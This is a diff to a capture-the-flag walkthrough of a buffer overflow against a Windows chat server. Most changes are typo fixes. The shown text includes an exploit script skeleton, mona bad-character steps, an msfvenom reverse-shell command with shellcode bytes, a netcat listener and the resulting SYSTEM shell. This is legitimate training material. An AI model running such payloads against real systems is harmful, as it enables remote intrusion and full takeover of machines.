@@ -86,7 +86,7 @@ It seems like there is a strange server running on 9999 called brainstorm chat (
 Enumerating Port 21 - FTP
 =========================
 
-Lets connected to the Port and use the user name : 'anonymous'
+Lets connected to the Port and use the username : 'anonymous'
 
     ftp 10.10.190.239
     Connected to 10.10.190.239.
@@ -130,6 +130,8 @@ Lets connected to the Port and use the user name : 'anonymous'
 
 Side note - I had alot of trouble with passive mode, make sure you disable before trying to run commands.
 
+    passive off
+
 Mona Config / Immunity Debugger
 ================================
 
@@ -145,7 +147,7 @@ The latest version can be downloaded here: https://github.com/corelan/mona
 
 Open the chatserver.exe and have a look at how it functions
 
-On your Kali box, connect to port 9999 on 1192.168.133.131 using netcat: 
+On your Kali box, connect to port 9999 on 192.168.133.131 using netcat: 
 
     Welcome to Brainstorm chat (beta)
     Please enter your username (max 20 characters): Dale
@@ -203,7 +205,7 @@ Create another file on your Kali box called exploit.py with the following conten
 
     prefix = "user "
     offset = 0
-    overflow = "" * offset
+    overflow = "A" * offset
     retn = ""
     padding = ""
     payload = ""
@@ -257,7 +259,7 @@ Update your exploit.py script and set the offset variable to this value (was pre
     payload = ""
     postfix = ""
     
-    buffer = prefix + overflow + retn + padding + payload + postfix
+    buffer = overflow + retn + padding + payload + postfix
 
 Crash the application using this buffer, and make sure that EIP is overwritten by B's (\\x42)e.g. 42424242.
 
@@ -285,15 +287,9 @@ Use the mona compare command to reference the bytearray you generated, and the a
 
 We take note of the badchars returned:
 
-00
+    “Unmodified” (This indicates that no more badchars exist)
 
-The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well.
-
-Our new Mona byarray command will look like this:
-
-    !mona bytearray -b "\x00"
-
-We repeat the badchar comparison until the results status returns “Unmodified”. This indicates that no more badchars exist. This means executing the expliot, running the Mona-look-for-bad-chars-command, if there are new badchars we run mona-generate-new-bytearray-excluding-new-badchards-command, update the exploit
+The first badchar in the list should be the null byte (\x00) since we already removed it from the file. 
 
 Find a Jump Point
 =================
@@ -313,7 +309,7 @@ Generate Payload
 
 Generate a reverse shell payload using msfvenom, making sure to exclude the same bad chars that were found previously:
 
-    msfvenom -p windows/shell_reverse_tcp LHOST=10.18.91.23 LPORT=4444 EXITFUNC=thread -b "\x00" -f py -k
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.18.91.23 LPORT=4444 EXITFUNC=thread -b "\x00" -f py
 
     buf =  ""
     buf += "\xda\xc0\xd9\x74\x24\xf4\x5a\xbb\x92\x97\x91\x3d"
@@ -347,6 +343,8 @@ Generate a reverse shell payload using msfvenom, making sure to exclude the same
     buf += "\x22\x1d\xa9\xb0\x27\x59\x6d\x29\x5a\xf2\x18\x4d"
     buf += "\xc9\xf3\x08"
     payload =buf
+    
+Note this does come with the prefix 'b' however I removed this and kept it as a string 
 
 Prepend NOPs
 ============
@@ -358,7 +356,7 @@ If an encoder was used (more than likely if bad chars are present, remember to p
 Final Buffer (Exploit)
 ============
 
-With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell. Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command (4444 if you didn’t change it).
+With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell. Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command
 
     nc - lvnp 4444
     listening on [any] 4444 ...
@@ -372,3 +370,5 @@ Restart chatserver.exe in Immunity and run the modified exploit.py script again.
     C:\Windows\system32>whoami
     whoami
     nt authority\system
+    
+Thank you, hope you enjoed this, and please feel free to give me any advice or guidance on how to do it better!
